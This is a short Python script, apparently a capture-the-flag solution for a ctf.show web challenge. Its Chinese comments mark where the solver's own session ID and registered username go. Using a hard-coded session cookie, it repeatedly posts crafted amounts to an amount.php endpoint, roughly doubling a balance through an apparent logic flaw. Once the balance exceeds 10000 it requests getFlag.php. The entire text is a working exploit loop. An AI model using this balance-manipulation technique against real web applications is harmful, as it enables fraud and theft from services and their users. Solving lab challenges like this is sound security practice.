import requests
import re
import time

x=5
url="http://623b0ed7-6f02-4ba6-839e-b55d6bd4948a.challenge.ctf.show/api/amount.php"
url2="http://623b0ed7-6f02-4ba6-839e-b55d6bd4948a.challenge.ctf.show/api/getFlag.php"
headers={'Cookie':'PHPSESSID=otcp1um67ulciv7eo3o2v7f0jr'}  #自己登录后的sessionid
while True:
    print(x)
    t=x-1
    data={
    'u':'ruiwen', #注册的用户名
    'a':str(t)
    }
    r=requests.post(url,headers=headers,data=data)
    print(r.text)
    if(x>10000):
        r2=requests.get(url2,headers=headers)
        print(r2.text)
        break
    x+=t